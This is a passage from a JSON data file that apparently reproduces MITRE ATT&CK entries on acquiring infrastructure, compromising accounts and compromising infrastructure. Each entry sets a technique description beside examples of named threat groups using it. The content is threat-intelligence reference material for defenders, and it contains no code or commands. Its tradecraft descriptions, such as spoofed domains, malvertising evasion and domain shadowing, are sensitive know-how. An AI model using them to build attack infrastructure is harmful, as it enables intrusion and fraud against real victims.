                        "Name": "Mustang Panda",
                        "Description": "<name> have acquired C2 domains prior to operations.[54][55][56]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort.[57]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "For <name>, the threat actors established domains as part of their operational infrastructure.[58]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "For <name>, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains.[59]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, threat actors registered domains for C2.[60]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors registered hundreds of domains using Duck DNS and DNS Exit.[61]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.[62][63]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.[64][65][66][67][68][69]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "For the <name>, APT29 acquired C2 domains, sometimes through resellers.[70][71]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has registered domains often containing the keywords \"kimjoy,\" \"h0pe,\" and \"grace,\" using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.[72][73]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has registered domains to impersonate services such as Dropbox to distribute malware.[74]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has obtained domains to host their payloads.[75]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has registered domains for C2.[76]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.[77][78]"
                    },
                    "G0044": {
                        "ID": "G0044",
                        "Name": "Winnti Group",
                        "Description": "<name> has registered domains for C2 that mimicked sites of their intended targets.[79]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has purchased domains for use in targeted campaigns.[80]"
                    }
                }
            },
            "002": {
                "name": "DNS Server",
                "href": "/techniques/T1583/002",
                "description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.[1]",
                "Procedure": {
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has acquired dynamic DNS services for use in the targeting of intended victims.[2]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has set up custom DNS servers to send commands to compromised hosts via TXT records.[3]"
                    }
                }
            },
            "003": {
                "name": "Virtual Private Server",
                "href": "/techniques/T1583/003",
                "description": "Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.[1]",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> hosted phishing domains on free services for brief periods of time during campaigns.[2]"
                    },
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has used VPS hosting providers in targeting of intended victims.[3]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure.[4]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has acquired VPS infrastructure for use in malicious campaigns.[5]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has operated from leased virtual private servers (VPS) in the United States.[6]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used VPS hosting providers for infrastructure.[7]"
                    }
                }
            },
            "004": {
                "name": "Server",
                "href": "/techniques/T1583/004",
                "description": "Adversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.[1][2] Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.[3]",
                "Procedure": {
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has acquired multiple servers for some of their operations, using each server for a different role.[4]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> has used Taiwan-based servers that appear to be exclusive to <name>.[5]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has purchased hosting servers with virtual currency and prepaid cards.[6]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months.[7]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors purchased hosted services to use for C2.[8]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group acquired servers to host their malicious tools.[9]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "For <name>, at least one identified persona was used to register for a free account for a control server.[10]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "For <name>, the threat actors purchased servers with Bitcoin to use during the operation.[11]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.[12]"
                    }
                }
            },
            "005": {
                "name": "Botnet",
                "href": "/techniques/T1583/005",
                "description": "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.[1] Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).[2][3][4][5]",
                "Procedure": {}
            },
            "006": {
                "name": "Web Services",
                "href": "/techniques/T1583/006",
                "description": "Adversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.[1] By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
                "Procedure": {
                    "G0025": {
                        "ID": "G0025",
                        "Name": "APT17",
                        "Description": "<name> has created profile pages in Microsoft TechNet that were used as C2 infrastructure.[2]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used newly-created Blogspot pages for credential harvesting operations.[3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. <name> has also used legitimate web services such as Dropbox and Constant Contact in their operations.[1][4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.[5]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has obtained cloud storage service accounts to host stolen data.[6]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has established GitHub accounts to host their malware.[7]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has set up Amazon S3 buckets to host trojanized digital products.[8]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has acquired web services for use in C2 and exfiltration.[9]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> created Dropbox accounts for their operations.[10][11]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has hosted content used for targeting efforts via web services such as Blogspot.[12]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has hosted malicious downloads on Github.[13]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has established GitHub accounts to host its toolsets.[14]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has acquired Amazon S3 buckets to use in C2.[15]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used file sharing services including OneHub, Sync, and TeraBox to distribute tools.[16][17][18]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used file hosting services like DropBox and OneDrive.[19]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "For <name>, the threat actors used Dropbox to host lure documents and their first-stage downloader.[20]"
                    },
                    "G1005": {
                        "ID": "G1005",
                        "Name": "POLONIUM",
                        "Description": "<name> has created and used legitimate Microsoft OneDrive accounts for their operations.[21]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub.[22]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has created web accounts including Dropbox and GitHub for C2 and document exfiltration.[23]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used GitHub to host malware linked in spearphishing e-mails.[24][25]"
                    }
                }
            },
            "007": {
                "name": "Serverless",
                "href": "/techniques/T1583/007",
                "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server.[1][2] As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.[3][1]",
                "Procedure": {}
            },
            "008": {
                "name": "Malvertising",
                "href": "/techniques/T1583/008",
                "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.[1] Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.[2][3] Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.[4] Malvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.[5]Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.[2] Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.[1]",
                "Procedure": {
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has posted false advertisements including for software packages and browser updates in order to distribute malware.[6]"
                    }
                }
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.[1] Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.[2] Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services.[3][4][5] Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
        "Procedure": {
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware used various third-party email campaign management services to deliver phishing emails.[6]"
            }
        }
    },
    "T1586": {
        "ttp_name": "Compromise Accounts",
        "ttp_id": "T1586",
        "href": "/techniques/T1586",
        "subtechnique": {
            "001": {
                "name": "Social Media Accounts",
                "href": "/techniques/T1586/001",
                "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).[1] Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.[2][3] Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
                "Procedure": {
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has compromised social media accounts to conduct social engineering attacks.[4]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> creates credential capture webpages to compromise existing, legitimate social media accounts.[5]"
                    }
                }
            },
            "002": {
                "name": "Email Accounts",
                "href": "/techniques/T1586/002",
                "description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).A variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.[1][2] Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used compromised email accounts to send credential phishing emails.[3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.[4][5]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used compromised accounts to send spearphishing emails.[6]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> has compromised legitimate email accounts to use in their spearphishing operations.[7]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has compromised email accounts to send spearphishing e-mails.[8][9]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has payed employees, suppliers, and business partners of target organizations for credentials.[10][11]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has compromised email accounts to conduct social engineering attacks.[12]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.[13]"
                    }
                }
            },
            "003": {
                "name": "Cloud Accounts",
                "href": "/techniques/T1586/003",
                "description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.[1]A variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens.[2] Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.[2]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments.[3]"
                    }
                }
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.[1][2] Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.",
        "Procedure": {}
    },
    "T1584": {
        "ttp_name": "Compromise Infrastructure",
        "ttp_id": "T1584",
        "href": "/techniques/T1584",
        "subtechnique": {
            "001": {
                "name": "Domains",
                "href": "/techniques/T1584/001",
                "description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.[1] Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.[2]Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.[3]Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.[4]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> hijacked FQDNs associated with legitimate websites hosted by hop points.[5]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "During <name>, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.[6]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "For <name>, the threat actors used legitimate but compromised domains to host malicious payloads.[7]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has compromised legitimate sites and used them to distribute malware.[8]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used compromised domains to host links targeted to specific phishing victims.[9][10][11][12]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.[13][14][15][16]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure.[17][18]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has compromised domains for some of their infrastructure, including for C2 and staging malware.[19]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "For the <name>, APT29 compromised domains to use for C2.[20]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has compromised domains for use in targeted malicious campaigns.[21]"
                    }
                }
            },
            "002": {
                "name": "DNS Server",
                "href": "/techniques/T1584/002",
                "description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.[1][2]  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.[2][3] Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.[4][5]",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has reconfigured a victim's DNS records to actor-controlled domains and websites.[6]"
                    }
                }
            },
            "003": {
                "name": "Virtual Private Server",
                "href": "/techniques/T1584/003",
                "description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.[1]Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
                "Procedure": {
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used the VPS infrastructure of compromised Iranian threat actors.[1]"
                    }
                }
            },
            "004": {
                "name": "Server",
                "href": "/techniques/T1584/004",
                "description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.[1] Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.",
                "Procedure": {
                    "G0023": {
                        "ID": "G0023",
                        "Name": "APT16",
                        "Description": "<name> has compromised otherwise legitimate sites as staging servers for second-stage payloads.[2]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has compromised legitimate websites to host C2 and malware modules.[3]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used compromised web servers as part of their operational infrastructure.[1]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has served fake updates via legitimate websites that have been compromised.[4]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has compromised servers to stage malicious tools.[5]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors compromised web servers to use for C2.[6]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group compromised servers to host their malicious tools.[7][8][9]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "For <name>, the threat actors compromised a server they used as part of the campaign's infrastructure.[10]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.[11][12]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used compromised servers as infrastructure.[13][14][15]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used compromised PRTG servers from other organizations for C2.[16]"
                    }
                }
            },
            "005": {
                "name": "Botnet",
                "href": "/techniques/T1584/005",
                "description": "Adversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.[1] Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.[2] Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.[3] With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",
                "Procedure": {
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has used large groups of compromised machines for use as proxy nodes.[4]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.[5]"
                    }
                }
            },
            "006": {
                "name": "Web Services",
                "href": "/techniques/T1584/006",
                "description": "Adversaries may compromise access to third-party web services\u00a0that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing.[1] Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
                "Procedure": {
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has compromised Google Drive repositories.[2]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has frequently used compromised WordPress sites for C2 infrastructure.[1]"
                    }
                }
            },
            "007": {
                "name": "Serverless",
                "href": "/techniques/T1584/007",
                "description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server.[1][2] As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.[3][1]",
                "Procedure": {}
            },
            "008": {
                "name": "Network Devices",
                "href": "/techniques/T1584/008",
                "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.[1][2]Compromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.[3]",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.[4]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.[5][6]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
